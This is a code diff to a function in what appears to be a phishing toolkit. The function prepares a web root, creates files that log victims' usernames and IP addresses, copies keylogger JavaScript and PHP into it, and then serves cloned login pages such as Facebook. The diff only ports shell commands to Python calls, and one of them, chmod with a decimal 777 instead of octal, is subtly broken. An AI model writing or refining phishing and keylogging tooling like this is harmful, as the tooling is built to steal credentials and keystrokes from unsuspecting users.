@@ -1,6 +1,8 @@
-from Defs.ImportManager.unsorted_will_be_replaced import run_command, webpage_set, wait, path
+from Defs.ImportManager.unsorted_will_be_replaced import run_command, webpage_set, wait, path, rmtree, pathlib_Path, copyfile
 import Defs.ThemeManager.theme as theme
 import Defs.ActionManager.simple_informant as simple_informant
+
+import os
 
 default_palette = theme.default_palette
 module_loading_message = simple_informant.module_loading_message
@@ -228,12 +230,34 @@ ________________________________________________________________________________
 
 
 def start_phishing_page(page, custom_option):  # Phishing pages selection menu
-    run_command('cd Server')
-    run_command('mkdir www')
-    run_command('chmod 777 Server -R')
-    run_command('rm -r Server/www/ && mkdir Server/www')
-    run_command('touch Server/www/usernames.txt && touch Server/www/ip.txt')
-    run_command('cp WebPages/ip.php Server/www/ && cp WebPages/KeyloggerData.txt Server/www/ && cp WebPages/keylogger.js Server/www/ && cp WebPages/keylogger.php Server/www/ && rm -rf link.url')
+    #run_command('cd Server')
+    ##os.chdir('Server')
+    #run_command('mkdir www')
+    ##os.mkdir('www')
+    #run_command('chmod 777 Server -R')
+    os.chmod('Server', 777)
+    #os.chdir('Server')
+    #run_command('rm -r Server/www/ && mkdir Server/www')
+    rmtree("Server/www", onerror=simple_informant.remove_readonly)
+    os.mkdir('Server/www')
+    os.chmod('Server/www', 777)
+    #run_command('touch Server/www/usernames.txt && touch Server/www/ip.txt')
+    pathlib_Path('Server/www/usernames.txt').touch()
+    pathlib_Path('Server/www/ip.txt').touch()
+    #run_command('cp WebPages/ip.php Server/www/
+    # && cp WebPages/KeyloggerData.txt Server/www/
+    # && cp WebPages/keylogger.js Server/www/ 
+    # && cp WebPages/keylogger.php Server/www/ 
+    # && rm -rf link.url')
+    copyfile('WebPages/ip.php', 'Server/www/ip.php')
+    copyfile('WebPages/KeyloggerData.txt','Server/www/KeyloggerData.txt')
+    copyfile('WebPages/keylogger.js', 'Server/www/keylogger.js')
+    copyfile('WebPages/keylogger.php', 'Server/www/keylogger.php')
+    try:
+        os.remove('link.url')
+    except:
+        pass
+
     if custom_option == '1' and page == 'Facebook':
         webpage_set("WebPages/fb_standard/", "Server/www/")
     elif custom_option == '2' and page == 'Facebook':
